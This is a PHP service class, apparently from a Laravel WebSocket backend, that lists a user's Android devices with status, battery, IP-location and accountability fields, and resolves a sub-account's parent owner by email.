<?php

declare(strict_types=1);

namespace App\WebSocket\Services;

use App\Models\Device;
use App\Models\User;
use App\WebSocket\ConnectionManager;

final class DeviceListService
{
    public function __construct(
        private readonly ConnectionManager $connectionManager,
        private readonly DatabaseReconnector $databaseReconnector,
    ) {}

    public function getDeviceListForUser(?int $userId): array
    {
        $this->databaseReconnector->reconnect();

        $query = Device::where('is_removed', false)
            ->with('user:id,username,email');

        if ($userId !== null) {
            $query->where('user_id', $userId);
        }

        return $query->orderByDesc('is_online')
            ->orderByDesc('last_seen_at')
            ->get()
            ->map(fn ($device) => $this->formatDeviceForList($device))
            ->toArray();
    }

    /**
     * 根据面板传入的 email 解析资源归属用户。
     *
     * 子账号 → 返回父账号的 id/email；主账号 → 返回自身的 id/email。
     * Admin 或未找到用户 → 返回 null（表示管理员，查看全部设备）。
     */
    public function resolveResourceOwnerByEmail(string $email): ?array
    {
        // Admin 判断已在调用方完成，此处仅处理普通用户
        $this->databaseReconnector->reconnect();

        $user = User::where('email', $email)->first();
        if ($user === null) {
            return null;
        }

        $owner = $user->getResourceOwner();

        return [
            'id' => $owner->id,
            'email' => $owner->email,
        ];
    }

    private function formatDeviceForList(Device $device): array
    {
        // 获取 Redis 中的实时状态（如果有）
        $realtimeStatus = $this->connectionManager->getDeviceStatus($device->uuid);

        return [
            'id' => $device->id,
            'uuid' => $device->uuid,
            'name' => $device->name,
            'remark' => $device->remark,
            'model' => $device->model,
            'android_version' => $device->android_version,
            'country' => $device->country,
            'ip_address' => $device->ip_address,
            'ip_location' => $device->ip_location,
            'network_type' => $realtimeStatus['network'] ?? null,
            'battery_level' => $device->battery_level,
            'battery_is_charging' => BatteryParser::parseCharging($realtimeStatus['battery_charge'] ?? ''),
            'is_online' => $device->is_online,
            'has_accessibility' => $device->has_accessibility,
            'last_seen_at' => $device->last_seen_at?->toIso8601String(),
            'installed_at' => $device->installed_at?->toIso8601String(),
            'user' => $device->user ? [
                'id' => $device->user->id,
                'username' => $device->user->username,
                'email' => $device->user->email,
            ] : null,
            'wallpap' => $realtimeStatus['wallpap'] ?? null,
            'screen_status' => $realtimeStatus['activz'] ?? null,
        ];
    }
}
